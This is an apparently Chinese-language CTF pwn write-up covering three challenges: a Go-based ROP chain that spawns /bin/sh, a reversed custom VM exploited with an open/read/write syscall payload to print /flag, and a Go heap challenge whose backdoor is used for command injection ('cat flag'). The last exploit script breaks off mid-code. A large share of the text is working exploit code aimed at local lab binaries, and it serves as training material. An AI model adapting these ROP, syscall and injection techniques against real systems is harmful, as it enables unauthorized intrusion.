+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0x000000000047eceb</span>)<span style=color:#666>+</span>p64(<span style=color:#666>0</span>)<span style=color:#666>+</span>p64(<span style=color:#666>0</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0x0000000000401c04</span>)
+</span></span><span style=display:flex><span>key <span style=color:#666>=</span> <span style=color:#b44>&#39;&#39;</span><span style=color:#666>.</span>join([<span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\\</span><span style=color:#b44>x</span><span style=color:#b68;font-weight:700>{:02X}</span><span style=color:#b44>&#39;</span><span style=color:#666>.</span>format(b) <span style=color:#a2f;font-weight:700>for</span> b <span style=color:#a2f;font-weight:700>in</span> payload])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>result <span style=color:#666>=</span> template<span style=color:#666>.</span>substitute(payload<span style=color:#666>=</span>key,<span style=color:#a2f>str</span><span style=color:#666>=</span><span style=color:#b44>&#34;/bin/sh</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#34;</span><span style=color:#666>+</span><span style=color:#b44>&#34;a&#34;</span><span style=color:#666>*</span><span style=color:#666>0x1f8</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f>print</span>(key)
+</span></span><span style=display:flex><span><span style=color:#a2f>print</span>(result)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>&#34;stop&#34;</span>,result<span style=color:#666>+</span><span style=color:#b44>&#34;end&#34;</span>)
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><ul><li>result的值</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#a2f;font-weight:700>package</span> main
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>func</span> <span style=color:#00a000>add</span>() <span style=color:#0b0;font-weight:700>string</span>{
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> <span style=color:#b44>&#34;/bin/sh\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>func</span> <span style=color:#00a000>main</span>() <span style=color:#0b0;font-weight:700>int</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> b <span style=color:#0b0;font-weight:700>string</span> = <span style=color:#b44>&#34;bbbbbbb&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> a <span style=color:#0b0;font-weight:700>string</span> = <span style=color:#00a000>add</span>()
+</span></span><span style=display:flex><span>    a = <span style=color:#b44>&#34;\x10\x80\x49\x00\x00\x00\x00\x00\x10\x80\x49\x00\x00\x00\x00\x00\x10\x80\x49\x00\x00\x00\x00\x00\x10\x80\x49\x00\x00\x00\x00\x00\x10\x80\x49\x00\x00\x00\x00\x00\x10\x80\x49\x00\x00\x00\x00\x00\x10\x80\x49\x00\x00\x00\x00\x00\x10\x80\x49\x00\x00\x00\x00\x00\xBE\x9E\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xEB\xEC\x47\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x1C\x40\x00\x00\x00\x00\x00&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> <span style=color:#666>0x3b</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>最终的ida反汇编结果如图所示,rsp+0x48处存的就是返回地址，可以看到给a的赋值全部都存到retaddr开始的地方，这里可以写上ROP。同时设置返回值为0x3b，这样就设置了rax=0x3b，而rdi的值是一开始add函数中/bin/sh的地址
+<img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/79.png alt> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/80.png alt></p><p>而且注意到var b string = &ldquo;bbbbbbb"不能删去，因为这里会根据这个调整栈布局，估计出题人也是边写exp边动调看栈布局进而修改exp <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/81.png alt></p><h1 id=vmcode>vmcode
+<a class=header-anchor href=#vmcode></a></h1><p><a href=https://www.bilibili.com/read/cv39270682/ title=参考文章 rel="noopener external nofollow noreferrer" target=_blank class=exturl>参考文章
+<i class="fa fa-external-link-alt"></i></a></p><p>sandbox后是这样一段代码,可以看到是从code段每次读取一个字节(此时rsi相当于ip)，然后减去0x21，如果这个值大于等于0则进行下面的处理 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/82.png alt></p><p>关与0x1257这一处代码看着比较奇怪，动调一下看看。<strong>可以看到pop rcx时刚好是0x123a处的代码</strong> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/83.png alt></p><p>可以看到<strong>通过从offset里面取出来两个字节存到rax中，然后ret到0x123a+rax处的代码进行执行</strong>，那么接下来的重点显然是分析offset存的都是什么 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/84.png alt>
+可以看到offset每两个字节存的值都是递增的，<strong>那么看到首地址是0x123a+0x3a=0x1274,这也是opcode=0x21处的代码，剩下的都是顺延就行</strong> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/85.png alt></p><p>接下来就看一开始怎么输出shellcode这个字符串以及怎么读opcode，在0x1417打断点，因为只有这里有syscall <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/86.png alt> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/87.png alt> 那么所有问题都解决了，read函数也是往code段读入，再结合最开始的分析，现在最终要解决的问题就是分析每个opcode。</p><p>需要注意的是这一处都属于0x2c处的代码 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/88.png alt></p><p>最后逆向出来的结果如下</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#b44>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#b44>rdi相当于sp,rsi相当于ip
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x21  push ip，ip=[ip]+ip+2  call指令
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x22 pop ip
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x23 xor [sp-0x10],[sp-0x8],sp-=1
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x24 swap [sp-8],[sp-18h]
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x25 swap [sp-8],[sp-10h]
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x26  push imm(32字节)  
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x27 将栈上第一个参数由单字节类型扩展为8字节类型 
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x28 sp-=1
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x29 shr [sp-8],8
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x2a push [sp-8]
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x2b shl [sp-8],8
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x2c pop rax,判断rax的值是否为0，不为0跳转到loc_138C，此时的ip=[ip]+ip+2  jmp指令
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x2d ror [sp-8],[sp-10h];mov [sp-10h],[sp-8];sp-=1
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x2e rol [sp-8],[sp-10h];mov [sp-10h],[sp-8];sp-=1
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x2f and [sp-8],[sp-10h];mov [sp-10h],[sp-8];sp-=1
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x30 比较重要
+</span></span></span><span style=display:flex><span><span style=color:#b44>push    rsi
+</span></span></span><span style=display:flex><span><span style=color:#b44>lea     rbx, stack
+</span></span></span><span style=display:flex><span><span style=color:#b44>mov     rax, [rbx+rdi*8-8]
+</span></span></span><span style=display:flex><span><span style=color:#b44>mov     rsi, [rbx+rdi*8-18h]
+</span></span></span><span style=display:flex><span><span style=color:#b44>mov     rdx, [rbx+rdi*8-20h]
+</span></span></span><span style=display:flex><span><span style=color:#b44>push    rdi
+</span></span></span><span style=display:flex><span><span style=color:#b44>mov     rdi, [rbx+rdi*8-10h]
+</span></span></span><span style=display:flex><span><span style=color:#b44>syscall              
+</span></span></span><span style=display:flex><span><span style=color:#b44>pop     rdi
+</span></span></span><span style=display:flex><span><span style=color:#b44>sub     rdi, 3
+</span></span></span><span style=display:flex><span><span style=color:#b44>pop     rsi
+</span></span></span><span style=display:flex><span><span style=color:#b44>mov     [rbx+rdi*8-8],                                                           
+</span></span></span><span style=display:flex><span><span style=color:#b44>retn
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x31 push sp
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x32 push ip 
+</span></span></span><span style=display:flex><span><span style=color:#b44>0x33 exit
+</span></span></span><span style=display:flex><span><span style=color:#b44>&#39;&#39;&#39;</span>
+</span></span></code></pre></div><p><strong>这里其实还有个难题是read和write的buf要怎么设置，这里用到了一种方法push rsp，然后shr再shl把rsp低8位清0，这样就不影响栈上原本的数据</strong></p><ul><li>exp</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u64
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u32
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u16
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u8
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p64
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p32
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p16
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p8
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwn</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>ctypes</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context(os<span style=color:#666>=</span><span style=color:#b44>&#39;linux&#39;</span>, arch<span style=color:#666>=</span><span style=color:#b44>&#39;amd64&#39;</span>, log_level<span style=color:#666>=</span><span style=color:#b44>&#39;debug&#39;</span>)
+</span></span><span style=display:flex><span>p <span style=color:#666>=</span> process(<span style=color:#b44>&#34;/home/zp9080/PWN/pwn&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=gdb.debug(&#34;/home/zp9080/PWN/pwn&#34;,&#39;b *$rebase(0x1417)&#39;)</span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=remote(&#39;192.168.18.22&#39;,9999)</span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=process([&#39;seccomp-tools&#39;,&#39;dump&#39;,&#39;/home/zp9080/PWN/pwn&#39;])</span>
+</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#b44>&#34;/home/zp9080/PWN/pwn&#34;</span>)
+</span></span><span style=display:flex><span>libc<span style=color:#666>=</span>elf<span style=color:#666>.</span>libc 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#b *$rebase(0x14F5)</span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>dbg</span>():
+</span></span><span style=display:flex><span>    gdb<span style=color:#666>.</span>attach(p,<span style=color:#b44>&#39;b *$rebase(0x109B)&#39;</span>)
+</span></span><span style=display:flex><span>    pause()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>call</span>(offset):
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x21</span>) <span style=color:#666>+</span> p16(offset)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>ret</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x22</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>xor</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x23</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>swap02</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x24</span>) 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>swap01</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x25</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>push_imm</span>(imm):
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x26</span>) <span style=color:#666>+</span> p32(imm)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>extand_byte</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x27</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>pop</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x28</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>shr</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x29</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>dup</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x2a</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>shl</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x2b</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>jmp</span>(offset):
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x2c</span>) <span style=color:#666>+</span> p16(offset)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>ror</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x2d</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>rol</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x2e</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>and_</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x2f</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>syscall</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x30</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>push_sp</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x31</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>push_ip</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x32</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>exit_</span>():
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p8(<span style=color:#666>0x33</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> flat([
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic># open(&#34;/flag&#34;, 0)</span>
+</span></span><span style=display:flex><span>    push_imm(<span style=color:#666>0x67616c66</span>), <span style=color:#080;font-style:italic># &#34;/flag&#34;</span>
+</span></span><span style=display:flex><span>    push_sp(),
+</span></span><span style=display:flex><span>    push_imm(<span style=color:#666>0x0</span>),
+</span></span><span style=display:flex><span>    swap01(),
+</span></span><span style=display:flex><span>    push_imm(<span style=color:#666>0x2</span>),
+</span></span><span style=display:flex><span>    syscall(),
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic># read(3, buf, 0x100)</span>
+</span></span><span style=display:flex><span>    push_imm(<span style=color:#666>0x100</span>),
+</span></span><span style=display:flex><span>    push_sp(),
+</span></span><span style=display:flex><span>    shr(),
+</span></span><span style=display:flex><span>    shl(),
+</span></span><span style=display:flex><span>    push_imm(<span style=color:#666>0x3</span>),
+</span></span><span style=display:flex><span>    push_imm(<span style=color:#666>0x0</span>),
+</span></span><span style=display:flex><span>    syscall(),
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic># write(1, buf, 0x100)</span>
+</span></span><span style=display:flex><span>    push_imm(<span style=color:#666>0x100</span>),
+</span></span><span style=display:flex><span>    push_sp(),
+</span></span><span style=display:flex><span>    shr(),
+</span></span><span style=display:flex><span>    shl(),
+</span></span><span style=display:flex><span>    push_imm(<span style=color:#666>0x1</span>),
+</span></span><span style=display:flex><span>    push_imm(<span style=color:#666>0x1</span>),
+</span></span><span style=display:flex><span>    syscall(),
+</span></span><span style=display:flex><span>])
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendline(payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><p>其实一开始复现这个题很迷茫，觉得自己RE能力不行做不出来，但是慢慢地顺着程序逻辑理清楚流程，慢慢的逆向还是做出来了，总之这种题就是要有耐心，慢慢来。</p><h1 id=c_or_go>c_or_go
+<a class=header-anchor href=#c_or_go></a></h1><p>一道go的逆向，顺着程序逻辑逆向发现有如下几个部分：</p><p>读取数据并对Json数据进行Unmarshal <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/89.png alt></p><p>不同的opcode对应不同的操作0-NewUser,1-ShowUser,2-DeleteUser,-1对应一个很奇怪的函数，这里一开始先不做分析</p><p>user_controller就和普通菜单堆里面的chunklist比较像,find_user是ShowUser和DeleteUser中都会先调用的函数，其功能就是找到对应的存储块,注意这里的strcmp函数
+<img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/90.png alt> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/91.png alt> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/92.png alt></p><p>NewUser函数开辟了很多空间，有的在堆块上，有的是mmap出来的，整体比较乱，不是很好具体分析。但是我们可以把他类比成普通菜单堆中的add函数，还是能正常地申请堆块</p><p>看完大致功能，先解决如何交互的问题。有Json肯定先搜索字符串看看都是什么样的键值对要求.看到如下字符串，同时看到下面有两个base64解码的操作，直接就去试试看能不能过交互，发现是可以的
+<img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/93.png alt></p><p><strong>对我个人而言，我觉得过这种交互就像是渗透测试一样，因为有的反汇编的东西太难以阅读分析，只能去试，所以遇到json最好先通过string看看有什么，如果直接看到的不行那就再跟进看看有没有相关字符串</strong></p><p>那么接下来分析opcode为-1那部分函数 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/94.png alt> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/95.png alt></p><p>main_CheckKey就是检查输入的是否和&amp;puts地址一样，其返回值是个bool类型，如果相同则进行main_Logs的调用 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/96.png alt></p><p>main_Logs函数进行拼接字符串，然后执行指令 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/97.png alt></p><p><strong>但是笔者在这里并没有看出命令执行到底体现在哪，虽然题目给了很明显的backdoor是这个，猜也能猜到这里是想通过命令执行的漏洞来cat flag，但是在我逆向分析的过程中，并没有看出来这里的漏洞。</strong>
+<strong>可能这种题目就是要靠一点猜吧，题目都给了直接的后门，而且后门还有利用条件(比较&amp;puts值)，所以出题人肯定想的是让你满足条件利用后门</strong></p><p>最后的攻击也比较简单了，直接利用malloc_consolidate合并fastbin然后泄露libcbase得到puts函数地址，利用后门进行命令执行cat flag</p><ul><li>exp</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u64
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u32
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u16
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u8
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p64
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p32
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p16
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p8
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>import</span> <span style=color:#00f;font-weight:700>base64</span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>import</span> <span style=color:#00f;font-weight:700>json</span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwn</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context(os<span style=color:#666>=</span><span style=color:#b44>&#39;linux&#39;</span>, arch<span style=color:#666>=</span><span style=color:#b44>&#39;amd64&#39;</span>, log_level<span style=color:#666>=</span><span style=color:#b44>&#39;debug&#39;</span>)
+</span></span><span style=display:flex><span>p <span style=color:#666>=</span> process(<span style=color:#b44>&#34;/home/zp9080/PWN/pwn&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=gdb.debug(&#34;/home/zp9080/PWN/pwn&#34;,&#39;b *0x4D9249&#39;)</span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=process([&#39;seccomp-tools&#39;,&#39;dump&#39;,&#39;/home/zp9080/PWN/pwn&#39;])</span>
+</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#b44>&#34;/home/zp9080/PWN/pwn&#34;</span>)
+</span></span><span style=display:flex><span>libc<span style=color:#666>=</span>elf<span style=color:#666>.</span>libc
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>dbg</span>():
+</span></span><span style=display:flex><span>    gdb<span style=color:#666>.</span>attach(p,<span style=color:#b44>&#39;b *0x4D8E12&#39;</span>)  
+</span></span><span style=display:flex><span>    pause()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>check</span>(name, content, size):
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    pay <span style=color:#666>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;task_type&#34;</span>: <span style=color:#666>-</span><span style=color:#666>1</span>,
+</span></span><span style=display:flex><span>        <span style=color:#080;font-style:italic>#b&#39;O2NhdCBmbGFn&#39; O2NhdCBmbGFn</span>
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;username&#34;</span>: base64<span style=color:#666>.</span>b64encode(name)<span style=color:#666>.</span>decode(),
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;content&#34;</span>: base64<span style=color:#666>.</span>b64encode(content)<span style=color:#666>.</span>decode(),
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;size&#34;</span>: size,
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> pay
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>add</span>(name, content, size):
+</span></span><span style=display:flex><span>    pay <span style=color:#666>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;task_type&#34;</span>: <span style=color:#666>0</span>,
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;username&#34;</span>: base64<span style=color:#666>.</span>b64encode(name)<span style=color:#666>.</span>decode(),
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;content&#34;</span>: base64<span style=color:#666>.</span>b64encode(content)<span style=color:#666>.</span>decode(),
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;size&#34;</span>: size,
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> pay
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>delete</span>(name, size<span style=color:#666>=</span><span style=color:#666>0</span>):
+</span></span><span style=display:flex><span>    pay <span style=color:#666>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#b44>&#34;task_type&#34;</span>: <span style=color:#666>2</span>,
